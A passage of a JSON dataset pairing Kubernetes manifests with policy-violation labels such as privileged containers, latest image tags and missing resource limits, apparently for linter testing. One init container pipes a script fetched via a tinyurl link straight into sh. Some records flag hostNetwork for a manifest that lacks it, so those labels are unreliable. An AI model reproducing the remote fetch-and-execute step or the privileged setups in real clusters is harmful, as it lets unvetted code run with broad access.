600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"hook\" has memory limit 0"
  },
  {
    "id": "6982",
    "manifest_path": "data/manifests/the_stack_sample/sample_2542.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: egress-ip-assign\n  labels:\n    name: egress-ip-assign\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: egress-ip-assign\n  template:\n    metadata:\n      labels:\n        name: egress-ip-assign\n    spec:\n      affinity:\n        podAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: class\n                operator: In\n                values:\n                - mediabot\n              - key: org\n                operator: In\n                values:\n                - empire\n            topologyKey: kubernetes.io/hostname\n      containers:\n      - name: egress-ip\n        image: docker.io/library/busybox:1.31.1\n        command:\n        - /bin/sh\n        - -c\n        securityContext:\n          privileged: true\n        env:\n        - name: EGRESS_IPS\n          value: 192.168.33.100/24 192.168.33.101/24\n        args:\n        - for i in $EGRESS_IPS; do ip address add $i dev enp0s8; done; sleep 10000000\n",
    "policy_id": "host-network",
    "violation_text": "resource shares host's network namespace (via hostNetwork=true)."
  },
  {
    "id": "6983",
    "manifest_path": "data/manifests/the_stack_sample/sample_2542.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: egress-ip-assign\n  labels:\n    name: egress-ip-assign\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: egress-ip-assign\n  template:\n    metadata:\n      labels:\n        name: egress-ip-assign\n    spec:\n      affinity:\n        podAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: class\n                operator: In\n                values:\n                - mediabot\n              - key: org\n                operator: In\n                values:\n                - empire\n            topologyKey: kubernetes.io/hostname\n      containers:\n      - name: egress-ip\n        image: docker.io/library/busybox:1.31.1\n        command:\n        - /bin/sh\n        - -c\n        securityContext:\n          privileged: true\n        env:\n        - name: EGRESS_IPS\n          value: 192.168.33.100/24 192.168.33.101/24\n        args:\n        - for i in $EGRESS_IPS; do ip address add $i dev enp0s8; done; sleep 10000000\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"egress-ip\" does not have a read-only root file system"
  },
  {
    "id": "6984",
    "manifest_path": "data/manifests/the_stack_sample/sample_2542.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: egress-ip-assign\n  labels:\n    name: egress-ip-assign\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: egress-ip-assign\n  template:\n    metadata:\n      labels:\n        name: egress-ip-assign\n    spec:\n      affinity:\n        podAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: class\n                operator: In\n                values:\n                - mediabot\n              - key: org\n                operator: In\n                values:\n                - empire\n            topologyKey: kubernetes.io/hostname\n      containers:\n      - name: egress-ip\n        image: docker.io/library/busybox:1.31.1\n        command:\n        - /bin/sh\n        - -c\n        securityContext:\n          privileged: true\n        env:\n        - name: EGRESS_IPS\n          value: 192.168.33.100/24 192.168.33.101/24\n        args:\n        - for i in $EGRESS_IPS; do ip address add $i dev enp0s8; done; sleep 10000000\n",
    "policy_id": "privilege-escalation-container",
    "violation_text": "container \"egress-ip\" is Privileged hence allows privilege escalation."
  },
  {
    "id": "6985",
    "manifest_path": "data/manifests/the_stack_sample/sample_2542.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: egress-ip-assign\n  labels:\n    name: egress-ip-assign\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: egress-ip-assign\n  template:\n    metadata:\n      labels:\n        name: egress-ip-assign\n    spec:\n      affinity:\n        podAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: class\n                operator: In\n                values:\n                - mediabot\n              - key: org\n                operator: In\n                values:\n                - empire\n            topologyKey: kubernetes.io/hostname\n      containers:\n      - name: egress-ip\n        image: docker.io/library/busybox:1.31.1\n        command:\n        - /bin/sh\n        - -c\n        securityContext:\n          privileged: true\n        env:\n        - name: EGRESS_IPS\n          value: 192.168.33.100/24 192.168.33.101/24\n        args:\n        - for i in $EGRESS_IPS; do ip address add $i dev enp0s8; done; sleep 10000000\n",
    "policy_id": "privileged-container",
    "violation_text": "container \"egress-ip\" is privileged"
  },
  {
    "id": "6986",
    "manifest_path": "data/manifests/the_stack_sample/sample_2542.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: egress-ip-assign\n  labels:\n    name: egress-ip-assign\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: egress-ip-assign\n  template:\n    metadata:\n      labels:\n        name: egress-ip-assign\n    spec:\n      affinity:\n        podAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: class\n                operator: In\n                values:\n                - mediabot\n              - key: org\n                operator: In\n                values:\n                - empire\n            topologyKey: kubernetes.io/hostname\n      containers:\n      - name: egress-ip\n        image: docker.io/library/busybox:1.31.1\n        command:\n        - /bin/sh\n        - -c\n        securityContext:\n          privileged: true\n        env:\n        - name: EGRESS_IPS\n          value: 192.168.33.100/24 192.168.33.101/24\n        args:\n        - for i in $EGRESS_IPS; do ip address add $i dev enp0s8; done; sleep 10000000\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"egress-ip\" is not set to runAsNonRoot"
  },
  {
    "id": "6987",
    "manifest_path": "data/manifests/the_stack_sample/sample_2542.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: egress-ip-assign\n  labels:\n    name: egress-ip-assign\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: egress-ip-assign\n  template:\n    metadata:\n      labels:\n        name: egress-ip-assign\n    spec:\n      affinity:\n        podAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: class\n                operator: In\n                values:\n                - mediabot\n              - key: org\n                operator: In\n                values:\n                - empire\n            topologyKey: kubernetes.io/hostname\n      containers:\n      - name: egress-ip\n        image: docker.io/library/busybox:1.31.1\n        command:\n        - /bin/sh\n        - -c\n        securityContext:\n          privileged: true\n        env:\n        - name: EGRESS_IPS\n          value: 192.168.33.100/24 192.168.33.101/24\n        args:\n        - for i in $EGRESS_IPS; do ip address add $i dev enp0s8; done; sleep 10000000\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"egress-ip\" has cpu request 0"
  },
  {
    "id": "6988",
    "manifest_path": "data/manifests/the_stack_sample/sample_2542.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: egress-ip-assign\n  labels:\n    name: egress-ip-assign\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: egress-ip-assign\n  template:\n    metadata:\n      labels:\n        name: egress-ip-assign\n    spec:\n      affinity:\n        podAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: class\n                operator: In\n                values:\n                - mediabot\n              - key: org\n                operator: In\n                values:\n                - empire\n            topologyKey: kubernetes.io/hostname\n      containers:\n      - name: egress-ip\n        image: docker.io/library/busybox:1.31.1\n        command:\n        - /bin/sh\n        - -c\n        securityContext:\n          privileged: true\n        env:\n        - name: EGRESS_IPS\n          value: 192.168.33.100/24 192.168.33.101/24\n        args:\n        - for i in $EGRESS_IPS; do ip address add $i dev enp0s8; done; sleep 10000000\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"egress-ip\" has memory limit 0"
  },
  {
    "id": "6989",
    "manifest_path": "data/manifests/the_stack_sample/sample_2543.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: tide\n  labels:\n    app: tide\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: tide\n  template:\n    metadata:\n      labels:\n        app: tide\n    spec:\n      serviceAccountName: tide\n      containers:\n      - name: tide\n        image: gcr.io/k8s-prow/tide:v20200910-8c70361b39\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --history-uri=gs://k8s-prow/tide-history.json\n        - --status-path=gs://k8s-prow/tide-status-checkpoint.yaml\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"tide\" does not have a read-only root file system"
  },
  {
    "id": "6990",
    "manifest_path": "data/manifests/the_stack_sample/sample_2543.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: tide\n  labels:\n    app: tide\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: tide\n  template:\n    metadata:\n      labels:\n        app: tide\n    spec:\n      serviceAccountName: tide\n      containers:\n      - name: tide\n        image: gcr.io/k8s-prow/tide:v20200910-8c70361b39\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --history-uri=gs://k8s-prow/tide-history.json\n        - --status-path=gs://k8s-prow/tide-status-checkpoint.yaml\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"tide\" not found"
  },
  {
    "id": "6991",
    "manifest_path": "data/manifests/the_stack_sample/sample_2543.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: tide\n  labels:\n    app: tide\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: tide\n  template:\n    metadata:\n      labels:\n        app: tide\n    spec:\n      serviceAccountName: tide\n      containers:\n      - name: tide\n        image: gcr.io/k8s-prow/tide:v20200910-8c70361b39\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --history-uri=gs://k8s-prow/tide-history.json\n        - --status-path=gs://k8s-prow/tide-status-checkpoint.yaml\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"tide\" is not set to runAsNonRoot"
  },
  {
    "id": "6992",
    "manifest_path": "data/manifests/the_stack_sample/sample_2543.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: tide\n  labels:\n    app: tide\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: tide\n  template:\n    metadata:\n      labels:\n        app: tide\n    spec:\n      serviceAccountName: tide\n      containers:\n      - name: tide\n        image: gcr.io/k8s-prow/tide:v20200910-8c70361b39\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --history-uri=gs://k8s-prow/tide-history.json\n        - --status-path=gs://k8s-prow/tide-status-checkpoint.yaml\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"tide\" has cpu request 0"
  },
  {
    "id": "6993",
    "manifest_path": "data/manifests/the_stack_sample/sample_2543.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: tide\n  labels:\n    app: tide\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: tide\n  template:\n    metadata:\n      labels:\n        app: tide\n    spec:\n      serviceAccountName: tide\n      containers:\n      - name: tide\n        image: gcr.io/k8s-prow/tide:v20200910-8c70361b39\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --history-uri=gs://k8s-prow/tide-history.json\n        - --status-path=gs://k8s-prow/tide-status-checkpoint.yaml\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"tide\" has memory limit 0"
  },
  {
    "id": "6994",
    "manifest_path": "data/manifests/the_stack_sample/sample_2546.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: jysinaks2-549f\n  labels:\n    app: jysinaks2-549f\nspec:\n  type: LoadBalancer\n  ports:\n  - port: 80\n    targetPort: 80\n    protocol: TCP\n    name: http\n  selector:\n    app: jysinaks2-549f\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:jysinaks2-549f])"
  },
  {
    "id": "6995",
    "manifest_path": "data/manifests/the_stack_sample/sample_2547.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: containerd-chaos\nspec:\n  selector:\n    matchLabels:\n      app: crictl\n  template:\n    metadata:\n      labels:\n        app: crictl\n      name: containerd-chaos\n    spec:\n      containers:\n      - image: quay.io/nsathyaseelan/crictl:latest\n        imagePullPolicy: IfNotPresent\n        name: containerd-chaos\n        command:\n        - sh\n        - -c\n        - echo Hello! && sleep 1800\n        volumeMounts:\n        - name: cri-socket\n          mountPath: /run/containerd/containerd.sock\n        - name: cri-config\n          mountPath: /etc/crictl.yaml\n      volumes:\n      - hostPath:\n          path: /run/containerd/containerd.sock\n        name: cri-socket\n      - hostPath:\n          path: /etc/crictl.yaml\n        name: cri-config\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"containerd-chaos\" is using an invalid container image, \"quay.io/nsathyaseelan/crictl:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "6996",
    "manifest_path": "data/manifests/the_stack_sample/sample_2547.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: containerd-chaos\nspec:\n  selector:\n    matchLabels:\n      app: crictl\n  template:\n    metadata:\n      labels:\n        app: crictl\n      name: containerd-chaos\n    spec:\n      containers:\n      - image: quay.io/nsathyaseelan/crictl:latest\n        imagePullPolicy: IfNotPresent\n        name: containerd-chaos\n        command:\n        - sh\n        - -c\n        - echo Hello! && sleep 1800\n        volumeMounts:\n        - name: cri-socket\n          mountPath: /run/containerd/containerd.sock\n        - name: cri-config\n          mountPath: /etc/crictl.yaml\n      volumes:\n      - hostPath:\n          path: /run/containerd/containerd.sock\n        name: cri-socket\n      - hostPath:\n          path: /etc/crictl.yaml\n        name: cri-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"containerd-chaos\" does not have a read-only root file system"
  },
  {
    "id": "6997",
    "manifest_path": "data/manifests/the_stack_sample/sample_2547.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: containerd-chaos\nspec:\n  selector:\n    matchLabels:\n      app: crictl\n  template:\n    metadata:\n      labels:\n        app: crictl\n      name: containerd-chaos\n    spec:\n      containers:\n      - image: quay.io/nsathyaseelan/crictl:latest\n        imagePullPolicy: IfNotPresent\n        name: containerd-chaos\n        command:\n        - sh\n        - -c\n        - echo Hello! && sleep 1800\n        volumeMounts:\n        - name: cri-socket\n          mountPath: /run/containerd/containerd.sock\n        - name: cri-config\n          mountPath: /etc/crictl.yaml\n      volumes:\n      - hostPath:\n          path: /run/containerd/containerd.sock\n        name: cri-socket\n      - hostPath:\n          path: /etc/crictl.yaml\n        name: cri-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"containerd-chaos\" is not set to runAsNonRoot"
  },
  {
    "id": "6998",
    "manifest_path": "data/manifests/the_stack_sample/sample_2547.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: containerd-chaos\nspec:\n  selector:\n    matchLabels:\n      app: crictl\n  template:\n    metadata:\n      labels:\n        app: crictl\n      name: containerd-chaos\n    spec:\n      containers:\n      - image: quay.io/nsathyaseelan/crictl:latest\n        imagePullPolicy: IfNotPresent\n        name: containerd-chaos\n        command:\n        - sh\n        - -c\n        - echo Hello! && sleep 1800\n        volumeMounts:\n        - name: cri-socket\n          mountPath: /run/containerd/containerd.sock\n        - name: cri-config\n          mountPath: /etc/crictl.yaml\n      volumes:\n      - hostPath:\n          path: /run/containerd/containerd.sock\n        name: cri-socket\n      - hostPath:\n          path: /etc/crictl.yaml\n        name: cri-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"containerd-chaos\" has cpu request 0"
  },
  {
    "id": "6999",
    "manifest_path": "data/manifests/the_stack_sample/sample_2547.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: containerd-chaos\nspec:\n  selector:\n    matchLabels:\n      app: crictl\n  template:\n    metadata:\n      labels:\n        app: crictl\n      name: containerd-chaos\n    spec:\n      containers:\n      - image: quay.io/nsathyaseelan/crictl:latest\n        imagePullPolicy: IfNotPresent\n        name: containerd-chaos\n        command:\n        - sh\n        - -c\n        - echo Hello! && sleep 1800\n        volumeMounts:\n        - name: cri-socket\n          mountPath: /run/containerd/containerd.sock\n        - name: cri-config\n          mountPath: /etc/crictl.yaml\n      volumes:\n      - hostPath:\n          path: /run/containerd/containerd.sock\n        name: cri-socket\n      - hostPath:\n          path: /etc/crictl.yaml\n        name: cri-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"containerd-chaos\" has memory limit 0"
  },
  {
    "id": "7000",
    "manifest_path": "data/manifests/the_stack_sample/sample_2548.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: web\n  labels:\n    app: web\nspec:\n  containers:\n  - name: web\n    image: pitnub/web:0.1\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  initContainers:\n  - name: init-data\n    image: busybox:1.32.1\n    command:\n    - sh\n    - -c\n    - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  volumes:\n  - name: app\n    emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"init-data\" does not have a read-only root file system"
  },
  {
    "id": "7001",
    "manifest_path": "data/manifests/the_stack_sample/sample_2548.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: web\n  labels:\n    app: web\nspec:\n  containers:\n  - name: web\n    image: pitnub/web:0.1\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  initContainers:\n  - name: init-data\n    image: busybox:1.32.1\n    command:\n    - sh\n    - -c\n    - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  volumes:\n  - name: app\n    emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"web\" does not have a read-only root file system"
  },
  {
    "id": "7002",
    "manifest_path": "data/manifests/the_stack_sample/sample_2548.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: web\n  labels:\n    app: web\nspec:\n  containers:\n  - name: web\n    image: pitnub/web:0.1\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  initContainers:\n  - name: init-data\n    image: busybox:1.32.1\n    command:\n    - sh\n    - -c\n    - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  volumes:\n  - name: app\n    emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"init-data\" is not set to runAsNonRoot"
  },
  {
    "id": "7003",
    "manifest_path": "data/manifests/the_stack_sample/sample_2548.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: web\n  labels:\n    app: web\nspec:\n  containers:\n  - name: web\n    image: pitnub/web:0.1\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  initContainers:\n  - name: init-data\n    image: busybox:1.32.1\n    command:\n    - sh\n    - -c\n    - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  volumes:\n  - name: app\n    emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"web\" is not set to runAsNonRoot"
  },
  {
    "id": "7004",
    "manifest_path": "data/manifests/the_stack_sample/sample_2548.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: web\n  labels:\n    app: web\nspec:\n  containers:\n  - name: web\n    image: pitnub/web:0.1\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  initContainers:\n  - name: init-data\n    image: busybox:1.32.1\n    command:\n    - sh\n    - -c\n    - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  volumes:\n  - name: app\n    emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"init-data\" has cpu request 0"
  },
  {
    "id": "7005",
    "manifest_path": "data/manifests/the_stack_sample/sample_2548.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: web\n  labels:\n    app: web\nspec:\n  containers:\n  - name: web\n    image: pitnub/web:0.1\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  initContainers:\n  - name: init-data\n    image: busybox:1.32.1\n    command:\n    - sh\n    - -c\n    - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  volumes:\n  - name: app\n    emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"web\" has cpu request 0"
  },
  {
    "id": "7006",
    "manifest_path": "data/manifests/the_stack_sample/sample_2548.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: web\n  labels:\n    app: web\nspec:\n  containers:\n  - name: web\n    image: pitnub/web:0.1\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  initContainers:\n  - name: init-data\n    image: busybox:1.32.1\n    command:\n    - sh\n    - -c\n    - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  volumes:\n  - name: app\n    emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"init-data\" has memory limit 0"
  },
  {
    "id": "7007",
    "manifest_path": "data/manifests/the_stack_sample/sample_2548.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: web\n  labels:\n    app: web\nspec:\n  containers:\n  - name: web\n    image: pitnub/web:0.1\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  initContainers:\n  - name: init-data\n    image: busybox:1.32.1\n    command:\n    - sh\n    - -c\n    - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  volumes:\n  - name: app\n    emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"web\" has memory limit 0"
  },
  {
    "id": "7008",
    "manifest_path": "data/manifests/the_stack_sample/sample_2549.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6983\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7009",
    "manifest_path": "data/manifests/the_stack_sample/sample_2549.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6983\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "7010",
    "manifest_path": "data/manifests/the_stack_sample/sample_2549.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6983\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "7011",
    "manifest_path": "data/manifests/the_stack_sample/sample_2549.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6983\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "7012",
    "manifest_path": "data/manifests/the_stack_sample/sample_2549.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6983\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "7013",
    "manifest_path": "data/manifests/the_stack_sample/sample_2550.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    run: ev-frontend\n  name: ev-frontend-service\nspec:\n  ports:\n  - port: 80\n    protocol: TCP\n    targetPort: 80\n  selector:\n    run: ev-frontend\n  sessionAffinity: None\n  type: NodePort\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[run:ev-frontend])"
  },
  {
    "id": "7014",
    "manifest_path": "data/manifests/the_stack_sample/sample_2551.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: app2\n  namespace: test\nspec:\n  containers:\n  - image: app2:latest\n    command:\n    - /bin/sh\n    - -c\n    - sleep 60m\n    imagePullPolicy: IfNotPresent\n    name: alpine\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"alpine\" is using an invalid container image, \"app2:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7015",
    "manifest_path": "data/manifests/the_stack_sample/sample_2551.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: app2\n  namespace: test\nspec:\n  containers:\n  - image: app2:latest\n    command:\n    - /bin/sh\n    - -c\n    - sleep 60m\n    imagePullPolicy: IfNotPresent\n    name: alpine\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"alpine\" does not have a read-only root file system"
  },
  {
    "id": "7016",
    "manifest_path": "data/manifests/the_stack_sample/sample_2551.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: app2\n  namespace: test\nspec:\n  containers:\n  - image: app2:latest\n    command:\n    - /bin/sh\n    - -c\n    - sleep 60m\n    imagePullPolicy: IfNotPresent\n    name: alpine\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"alpine\" is not set to runAsNonRoot"
  },
  {
    "id": "7017",
    "manifest_path": "data/manifests/the_stack_sample/sample_2551.yaml",
